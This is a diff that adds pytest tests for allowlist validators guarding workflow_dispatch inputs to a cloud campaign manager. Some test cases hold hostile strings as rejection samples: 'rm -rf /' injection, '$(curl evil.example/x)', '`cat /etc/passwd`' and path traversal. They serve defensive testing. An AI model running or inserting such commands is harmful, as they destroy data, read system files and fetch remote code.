@@ -8,6 +8,7 @@ The cloud module is intentionally mocked (see ``conftest.fake_aws_clients``).
 
 from __future__ import annotations
 
+import argparse
 import json
 import urllib.error
 from dataclasses import asdict
@@ -805,3 +806,263 @@ def test_concurrent_workers_complete_without_lock_issue_1791():
     states = store.list_states(campaign_id)
     assert len(states) == workers * writes_per_worker
     assert all(s.status == TaskStatus.COMPLETED for s in states)
+
+
+# ---------------------------------------------------------------------------
+# Issue #3449 — workflow_dispatch input allowlist validators.
+#
+# These tests pin the security contract: every value that can be set via
+# `.github/workflows/cloud_campaign.yml` (which is workflow_dispatch-only,
+# write-access users) is rejected by the validators below if it could
+# trigger shell injection, AWS API misuse, or path traversal in the
+# downstream coordinator.
+# ---------------------------------------------------------------------------
+
+
+def _dispatch_namespace(**overrides):
+    """Build an argparse.Namespace that passes `validate_dispatch_inputs` by default.
+
+    Tests override individual fields to assert rejection / acceptance. Any
+    new validator added to `validate_dispatch_inputs` must extend the
+    defaults here or these tests will start failing for the wrong reason.
+    """
+    defaults = dict(
+        case="600",
+        params=None,
+        sweep_type="random",
+        samples=50,
+        s3_bucket="fluxion-test-bucket",
+        s3_prefix="fluxion/test",
+        sns_topic=None,
+    )
+    defaults.update(overrides)
+    return argparse.Namespace(**defaults)
+
+
+def test_validate_case_id_accepts_ashrae_range():
+    """ASHRAE 140 case IDs span 3-4 digit decimal numbers."""
+    for value in ("600", "800", "900", "1200"):
+        assert ccm.validate_case_id(value) == value
+
+
+def test_validate_case_id_rejects_injection_attempts():
+    """`workflow_dispatch` is privileged but the validator must still reject
+    shell-metacharacter payloads even if a maintainer is socially engineered
+    into dispatching one (the original Issue #3449 threat model)."""
+    for bad in (
+        "600; rm -rf /",
+        "$(curl evil.example/x)",
+        "`cat /etc/passwd`",
+        "600\n",
+        "",
+        "60",  # too short
+        "12345",  # too long
+        "abc",
+        "600 ",
+        " 600",
+    ):
+        with pytest.raises(ValueError, match="Invalid case_id"):
+            ccm.validate_case_id(bad)
+
+
+def test_validate_params_accepts_known_names():
+    """The built-in parameter names plus any valid identifier are allowed."""
+    out = ccm.validate_params("R_value,wall_thickness,thermal_mass,h_tr_is")
+    assert out == ["R_value", "wall_thickness", "thermal_mass", "h_tr_is"]
+    # Single name + comma-separated unknown-but-valid identifiers
+    assert ccm.validate_params("custom_param") == ["custom_param"]
+
+
+def test_validate_params_rejects_shell_metachars_and_traversal():
+    """Issue #3449 — ``--params`` is a free-text input; without validation it
+    is a shell-injection vector."""
+    for bad in (
+        "",
+        "a;b",
+        "$(whoami)",
+        "`cat /etc/passwd`",
+        "../etc/passwd",
+        "R_value,evil param",
+        ",R_value",
+        "R_value,",
+    ):
+        with pytest.raises(ValueError):
+            ccm.validate_params(bad)
+
+
+def test_validate_s3_bucket_accepts_dns_compliant_names():
+    for name in ("my-bucket", "fluxion.test-bucket", "abc", "a" * 63):
+        assert ccm.validate_s3_bucket(name) == name
+
+
+def test_validate_s3_bucket_rejects_unsafe_names():
+    """Uppercase, underscores, leading dashes, and adjacent dots are invalid
+    per AWS naming rules; the validator rejects them as well."""
+    for bad in (
+        "Bucket_With_Underscore",
+        "../etc",
+        "-leading-dash",
+        "trailing-dash-",
+        "BUCKET",
+        "a",
+        "a" * 64,
+        "Bucket..DoubleDot",
+    ):
+        with pytest.raises(ValueError, match="Invalid s3 bucket name"):
+            ccm.validate_s3_bucket(bad)
+
+
+def test_validate_s3_prefix_accepts_safe_prefixes():
+    for prefix in ("", "fluxion-campaigns", "fluxion/test", "a/b/c/d"):
+        assert ccm.validate_s3_prefix(prefix) == prefix
+
+
+def test_validate_s3_prefix_rejects_traversal_and_metachars():
+    """Path traversal (`..`) and shell metacharacters must be rejected."""
+    for bad in (
+        "../etc/passwd",
+        "..",
+        "fluxion/../etc",
+        "a/../b",
+        "a;b",
+        "a b",
+        "$(whoami)",
+        "/abs/leading-slash",
+        "trailing/",
+        "//double-slash",
+    ):
+        with pytest.raises(ValueError, match="Invalid s3 prefix"):
+            ccm.validate_s3_prefix(bad)
+
+
+def test_validate_sns_topic_accepts_valid_arn_and_empty():
+    assert (
+        ccm.validate_sns_topic("arn:aws:sns:us-east-1:123456789012:test-topic")
+        == "arn:aws:sns:us-east-1:123456789012:test-topic"
+    )
+    # Empty string means "no SNS topic configured" and is allowed.
+    assert ccm.validate_sns_topic("") == ""
+
+
+def test_validate_sns_topic_rejects_non_arn_strings():
+    for bad in (
+        "https://example.com/topic",
+        "arn:aws:s3:::bucket",
+        "arn:EVIL",
+        "arn:aws:sns:us-east-1:abc:not-a-number-account",
+    ):
+        with pytest.raises(ValueError, match="Invalid sns topic arn"):
+            ccm.validate_sns_topic(bad)
+
+
+def test_validate_samples_rejects_non_positive():
+    for bad in (0, -1, -100):
+        with pytest.raises(ValueError, match="Invalid samples"):
+            ccm.validate_samples(bad)
+
+
+def test_validate_samples_accepts_positive_integers_and_str_digits():
+    assert ccm.validate_samples(1) == 1
+    assert ccm.validate_samples(1000) == 1000
+    assert ccm.validate_samples("42") == 42
+
+
+def test_validate_samples_rejects_non_numeric():
+    with pytest.raises(ValueError, match="Invalid samples"):
+        ccm.validate_samples("not-a-number")
+
+
+def test_validate_dispatch_inputs_accepts_clean_namespace():
+    """The default namespace passes."""
+    ccm.validate_dispatch_inputs(_dispatch_namespace())
+
+
+@pytest.mark.parametrize(
+    "field,bad_value",
+    [
+        ("case", "600; rm -rf /"),
+        ("params", "a;b"),
+        ("samples", 0),
+        ("s3_bucket", "Bad_Bucket"),
+        ("s3_prefix", "../etc"),
+        ("sns_topic", "https://evil.example/x"),
+    ],
+)
+def test_validate_dispatch_inputs_rejects_each_field(field, bad_value):
+    """Each allowlist field rejects its malicious value independently."""
+    ns = _dispatch_namespace(**{field: bad_value})
+    with pytest.raises(ValueError):
+        ccm.validate_dispatch_inputs(ns)
+
+
+def test_main_returns_2_on_invalid_dispatch_input(monkeypatch, capsys):
+    """`main()` must surface validator failures as exit code 2 (configuration
+    error, distinct from 1=runtime failure) — mirrors the documented exit
+    code contract in the module docstring."""
+    import sys as _sys
+
+    monkeypatch.setattr(
+        _sys,
+        "argv",
+        [
+            "cloud_campaign_manager.py",
+            "--action",
+            "create",
+            "--case",
+            "600; rm -rf /",
+            "--s3-bucket",
+            "fluxion-test-bucket",
+        ],
+    )
+    rc = ccm.main()
+    assert rc == 2
+    err = capsys.readouterr().err
+    assert "Invalid dispatch input" in err
+
+
+def test_main_reads_env_var_defaults_for_user_controlled_inputs(
+    monkeypatch, fake_aws_clients
+):
+    """Issue #3449: the workflow passes all user-controlled inputs via env
+    vars. `main()` must consume them as defaults so the script can be
+    invoked without `--case`/`--params`/etc. on the command line.
+    """
+    import sys as _sys
+
+    monkeypatch.setenv("FLUXION_CAMPAIGN_CASE", "900")
+    monkeypatch.setenv("FLUXION_CAMPAIGN_PARAMS", "R_value,thermal_mass")
+    monkeypatch.setenv("FLUXION_CAMPAIGN_SWEEP_TYPE", "latin_hypercube")
+    monkeypatch.setenv("FLUXION_CAMPAIGN_SAMPLES", "10")
+    monkeypatch.setenv("FLUXION_S3_BUCKET", "fluxion-env-bucket")
+    monkeypatch.setenv("FLUXION_S3_PREFIX", "fluxion-env/prefix")
+    monkeypatch.setattr(
+        _sys,
+        "argv",
+        ["cloud_campaign_manager.py", "--action", "create"],
+    )
+    rc = ccm.main()
+    assert rc == 0
+    # S3 mock received the env-derived bucket/prefix and a work-unit write
+    s3 = fake_aws_clients["s3"]
+    assert "fluxion-env-bucket" in s3.bucket_objects
+    keys = list(s3.bucket_objects["fluxion-env-bucket"].keys())
+    assert any(k.startswith("fluxion-env/prefix/work-units/") for k in keys), keys
+    assert any(k.startswith("fluxion-env/prefix/campaigns/") for k in keys), keys
+
+
+def test_main_env_var_rejected_value_returns_2(monkeypatch, capsys):
+    """Defense in depth: even via env vars, malicious dispatch values must
+    be rejected. This guards against an attacker who compromises
+    `vars.*` (the workflow cannot restrict env vars to safe chars)."""
+    import sys as _sys
+
+    monkeypatch.setenv("FLUXION_CAMPAIGN_CASE", "abc; evil")
+    monkeypatch.setenv("FLUXION_S3_BUCKET", "fluxion-test-bucket")
+    monkeypatch.setattr(
+        _sys,
+        "argv",
+        ["cloud_campaign_manager.py", "--action", "create"],
+    )
+    rc = ccm.main()
+    assert rc == 2
+    assert "Invalid dispatch input" in capsys.readouterr().err
